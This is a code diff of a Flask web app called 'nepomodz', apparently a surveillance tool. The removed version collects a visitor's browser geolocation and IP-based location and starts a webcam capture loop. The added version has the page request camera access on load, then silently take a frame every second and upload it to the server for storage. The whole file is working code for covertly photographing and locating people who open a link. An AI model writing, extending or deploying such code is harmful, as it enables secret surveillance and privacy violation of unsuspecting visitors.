@@ -1,97 +1,84 @@
-from flask import Flask, request, render_template_string
-import os
-import requests
+from flask import Flask, request, render_template_string, jsonify
 from datetime import datetime
-import threading
-import cv2
-import time
+import os
 
 app = Flask(__name__)
 
-# Function to get approximate location from IP address
-def get_approximate_location():
-    try:
-        response = requests.get('https://ipinfo.io')
-        data = response.json()
-        location = data.get('loc', 'Unknown')
-        city = data.get('city', 'Unknown')
-        region = data.get('region', 'Unknown')
-        country = data.get('country', 'Unknown')
-        return f"IP Location: {location}, City: {city}, Region: {region}, Country: {country}"
-    except Exception as e:
-        return f"IP Location: Unknown (Error: {str(e)})"
+# Directory to save images
+IMAGE_DIR = "captured_images"
+if not os.path.exists(IMAGE_DIR):
+    os.makedirs(IMAGE_DIR)
 
-# Function to capture images continuously
-def capture_images():
-    # Create a directory to save images
-    if not os.path.exists('captured_images'):
-        os.makedirs('captured_images')
-
-    # Initialize the camera
-    cap = cv2.VideoCapture(0)
-
-    if not cap.isOpened():
-        print("Error: Could not open camera.")
-        return
-
-    # Continuously capture images
-    while True:
-        ret, frame = cap.read()
-        if ret:
-            image_path = f"captured_images/image_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
-            cv2.imwrite(image_path, frame)
-            print(f"Image saved: {image_path}")
-        else:
-            print("Error: Could not capture image.")
-        time.sleep(1)  # Capture an image every second
-
-    # Release the camera (this won't be reached in this example)
-    cap.release()
-
-# HTML template with JavaScript to request camera and location access
+# HTML template with JavaScript to request camera access and capture images
 HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>nepomodz Access Request</title>
+    <title>nepomodz Camera Access</title>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition);
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        }
+        let isCapturing = false;
+        let mediaStream = null;
 
-        function showPosition(position) {
-            document.getElementById('location').value = position.coords.latitude + "," + position.coords.longitude;
-            document.getElementById('dataForm').submit();
-        }
-
-        function getCamera() {
+        function startCapture() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
-                    alert("Camera access granted.");
-                    document.getElementById('camera').value = "Accessed";
-                    document.getElementById('dataForm').submit();
+                    mediaStream = stream;
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Start capturing images
+                    isCapturing = true;
+                    captureFrame(video);
                 })
                 .catch(function(err) {
                     alert("Camera access denied.");
                 });
         }
 
-        window.onload = function() {
-            getLocation();
-            getCamera();
+        function captureFrame(video) {
+            if (!isCapturing) return;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Send the image data to the server
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('image', blob);
+
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.json())
+                  .then(data => console.log(data))
+                  .catch(error => console.error(error));
+            }, 'image/jpeg');
+
+            // Capture the next frame after a delay
+            setTimeout(() => captureFrame(video), 1000); // Capture every 1 second
         }
+
+        function stopCapture() {
+            isCapturing = false;
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // Start capturing when the page loads
+        window.onload = startCapture;
+
+        // Stop capturing when the user leaves the page
+        window.onbeforeunload = stopCapture;
     </script>
 </head>
 <body>
     <h1>Welcome to nepomodz</h1>
-    <form id="dataForm" action="/save" method="post">
-        <input type="hidden" id="location" name="location">
-        <input type="hidden" id="camera" name="camera">
-    </form>
+    <p>Camera access granted. Capturing images...</p>
 </body>
 </html>
 '''
@@ -100,22 +87,21 @@ HTML = '''
 def index():
     return render_template_string(HTML)
 
-@app.route('/save', methods=['POST'])
-def save():
-    location = request.form.get('location', 'Not provided')
-    camera = request.form.get('camera', 'Not provided')
-    ip_location = get_approximate_location()
+@app.route('/upload', methods=['POST'])
+def upload():
+    if 'image' not in request.files:
+        return jsonify({"error": "No image provided"}), 400
 
-    # Save data to file
-    with open('data.txt', 'a') as f:
-        f.write(f"Time: {datetime.now()}, Location: {location}, IP Location: {ip_location}, Camera: {camera}\n")
+    image = request.files['image']
+    if image.filename == '':
+        return jsonify({"error": "No image selected"}), 400
 
-    # If camera access is granted, start capturing images
-    if camera == "Accessed":
-        print("Access has been granted. Starting to capture images...")
-        threading.Thread(target=capture_images, daemon=True).start()
+    # Save the image to the captured_images directory
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    image_path = os.path.join(IMAGE_DIR, f"image_{timestamp}.jpg")
+    image.save(image_path)
 
-    return "Data saved by nepomodz."
+    return jsonify({"message": "Image saved successfully", "path": image_path})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
